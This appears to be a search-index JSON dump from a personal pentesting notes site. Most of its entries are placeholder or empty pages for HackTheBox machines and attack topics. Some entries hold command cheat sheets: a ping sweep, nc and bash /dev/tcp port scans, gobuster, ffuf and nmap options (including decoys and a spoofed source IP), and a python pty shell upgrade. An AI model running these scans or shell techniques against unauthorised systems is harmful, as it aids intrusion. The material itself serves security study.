Directory"},{"categories":null,"contents":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/attacking_services/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/attacking_services/","summary":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Attacking Services"],"title":"[Pentesting] Attacking Services"},{"categories":null,"contents":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/file_transfers/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/file_transfers/","summary":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["File Transfers"],"title":"[Pentesting] File Transfers"},{"categories":null,"contents":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/footprinting_and_enumeration/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/footprinting_and_enumeration/","summary":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Footprinting and Enumeration"],"title":"[Pentesting] Footprinting and Enumeration"},{"categories":null,"contents":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/linux_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/linux_privilege_escalation/","summary":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Linux Privilege Escalation"],"title":"[Pentesting] Linux Privilege Escalation"},{"categories":null,"contents":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/mobile_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/mobile_pentesting/","summary":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Mobile Pentesting"],"title":"[Pentesting] Mobile Pentesting"},{"categories":null,"contents":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/network_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/network_pentesting/","summary":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Network Pentesting"],"title":"[Pentesting] Network Pentesting"},{"categories":null,"contents":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/osint/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/osint/","summary":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["OSINT"],"title":"[Pentesting] OSINT"},{"categories":null,"contents":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/","summary":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Pivoting, Tunneling and Port Forwarding"],"title":"[Pentesting] Pivoting, Tunneling and Port Forwarding"},{"categories":null,"contents":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/shells_and_payloads/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/shells_and_payloads/","summary":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Shells and Payloads"],"title":"[Pentesting] Shells and Payloads"},{"categories":null,"contents":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/web_attacks/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/web_attacks/","summary":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Web Attacks"],"title":"[Pentesting] Web Attacks"},{"categories":null,"contents":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/windows_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/windows_privilege_escalation/","summary":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Windows Privilege Escalation"],"title":"[Pentesting] Windows Privilege Escalation"},{"categories":null,"contents":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/pwn.college/overview/images/pwn.college.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pwn.college/overview/","summary":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","tags":["pwn.college"],"title":"[pwn.college] Overview"},{"categories":null,"contents":"This section will contain Guided Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/guided-hacking/overview/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/overview/","summary":"This section will contain Guided Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] Overview"},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ambassador/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/awkward/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/broscience/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/catch/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/encoding/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/epsilon/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/faculty/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/flustered/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/forgot/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/interface/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/investigation/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/logforge/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mentor/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/meta/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/noter/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/openkeys/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ransom/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/retired/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shared/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/timing/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/undetected/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/arkham/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/hancliffe/","summary":"","tags":null,"title":""},{"categories":null,"contents":"","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/re/","summary":"","tags":null,"title":""},{"categories":null,"contents":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/ansible/","summary":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","tags":null,"title":"Ansible"},{"categories":null,"contents":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/box-settings/","summary":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","tags":null,"title":"Box-settings"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/ffuf/","summary":"Wfuzz Options ","tags":null,"title":"Ffuf"},{"categories":null,"contents":"Gobuster Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/gobuster/","summary":"Gobuster Options ","tags":null,"title":"Gobuster"},{"categories":null,"contents":"Kiterunner Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/kiterunner/","summary":"Kiterunner Options ","tags":null,"title":"Kiterunner"},{"categories":null,"contents":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.10.10.7/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k - gobuster ignore certificate ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://\u0026lt;website\u0026gt;.com' -H 'Host: FUZZ.\u0026lt;website\u0026gt;.com' - ffuf vhost enumeration ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/misc/","summary":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.","tags":null,"title":"Miscellaneous"},{"categories":null,"contents":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent. -p- - Scan all ports. -p22-110 - Scan all ports between 22 and 110. -p22,25 - Scans only the specified ports 22 and 25. -F - Scans top 100 ports. -sS - Performs an TCP SYN-Scan. -sA - Performs an TCP ACK-Scan. -sU - Performs an UDP Scan. -sV - Scans the discovered services for their versions. -sC - Perform a Script Scan with scripts that are categorized as \u0026ldquo;default\u0026rdquo;. --script \u0026lt;script\u0026gt; - Performs a Script Scan by using the specified scripts. -O - Performs an OS Detection Scan to determine the OS of the target. -A - Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 - Sets the number of random Decoys that will be used to scan the target. -e - Specifies the network interface that is used for the scan. -S 10.10.10.200 - Specifies the source IP address for the scan. -g - Specifies the source port for the scan. --dns-server \u0026lt;ns\u0026gt; - DNS resolution is performed by using a specified name server. Output Options -oA filename - Stores the results in all available formats starting with the name of \u0026ldquo;filename\u0026rdquo;. -oN filename - Stores the results in normal format with the name \u0026ldquo;filename\u0026rdquo;. -oG filename - Stores the results in \u0026ldquo;grepable\u0026rdquo; format with the name of \u0026ldquo;filename\u0026rdquo;. -oX filename - Stores the results in XML format with the name of \u0026ldquo;filename\u0026rdquo;. Performance Options --max-retries \u0026lt;num\u0026gt; - Sets the number of retries for scans of specific ports. --stats-every=5s - Displays scan\u0026rsquo;s status every 5 seconds. -v/-vv - Displays verbose output during the scan. --initial-rtt-timeout 50ms - Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms - Sets the specified time value as maximum RTT timeout. --min-rate 300 - Sets the number of packets that will be sent simultaneously. -T \u0026lt;0-5\u0026gt; - Specifies the specific timing template. ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/nmap/","summary":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent.","tags":null,"title":"Nmap"},{"categories":null,"contents":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/other/","summary":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","tags":null,"title":"Other"},{"categories":null,"contents":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/shell/","summary":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","tags":null,"title":"Shell"},{"categories":null,"contents":"SQLmap Options SQLmap Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/web_attacks/sqlmap/","summary":"SQLmap Options SQLmap Options ","tags":null,"title":"SQLmap"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/wfuzz/","summary":"Wfuzz Options ","tags":null,"title":"Wfuzz"}]